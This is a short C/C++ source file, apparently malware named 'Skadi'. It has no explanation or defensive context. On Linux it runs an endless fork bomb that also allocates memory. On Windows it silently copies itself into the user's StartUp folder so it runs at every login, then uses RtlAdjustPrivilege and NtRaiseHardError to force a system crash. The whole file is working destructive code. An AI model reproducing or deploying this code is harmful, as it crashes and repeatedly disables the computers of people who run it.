#include "Skadi.h"

#ifdef __linux__

void linux_skadi() 
{
	while (1) 
	{
		fork();
		memset(malloc(1024*1024L), 'w', 1024*1024L);
	}
}

#elif _WIN32

bool FileExists(std::wstring fileName)
{
	DWORD fileAttr;

	fileAttr = GetFileAttributes((LPCSTR)fileName.c_str());
	if (0xFFFFFFFF == fileAttr)
		return false;
	return true;
}

void copyFileToStartUp()
{
	wchar_t Source[MAX_PATH] = { 0 };
	GetModuleFileNameW(0, Source, MAX_PATH);

	// get file name from path
	std::wstring wFileName;
	wFileName = PathFindFileNameW((LPCWSTR)Source);

	// get path to 'StartUp' folder
	PWSTR path;
	SHGetKnownFolderPath(FOLDERID_Startup, 0, NULL, &path);

	// create destination path with file name
	std::wstring Dest(path);
	Dest = Dest + L"\\";
	Dest += wFileName;

	bool status = FileExists(Dest.c_str());

	if (status == FALSE)
	{
		SHFILEOPSTRUCTW fileOperation;
		memset(&fileOperation, 0, sizeof(SHFILEOPSTRUCTW));

		fileOperation.wFunc = FO_COPY;
		fileOperation.fFlags = FOF_SILENT | FOF_NOCONFIRMATION | FOF_NOCONFIRMMKDIR | FOF_NOERRORUI | FOF_FILESONLY;
		fileOperation.pFrom = (PCZZWSTR)Source;
		fileOperation.pTo = (PCZZWSTR)Dest.c_str();

		int result = SHFileOperationW(&fileOperation);
		if (result != 0)
		{
			printf("SHFileOperation Failure: Error%u\n", result);
		}

		memset(&fileOperation, 0, sizeof(SHFILEOPSTRUCTW));
	}
}

void windows_skadi() 
{
	BOOLEAN bEnabled;
	ULONG uResp;
	LPVOID lpFuncAddress = GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
	LPVOID lpFuncAddress2 = GetProcAddress(GetModuleHandle("ntdll.dll"), "NtRaiseHardError");
	pdef_RtlAdjustPrivilege NtCall = (pdef_RtlAdjustPrivilege)lpFuncAddress;
	pdef_NtRaiseHardError NtCall2 = (pdef_NtRaiseHardError)lpFuncAddress2;
	NTSTATUS NtRet = NtCall(19, TRUE, FALSE, &bEnabled);
	NtCall2(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, 6, &uResp);
}

#endif
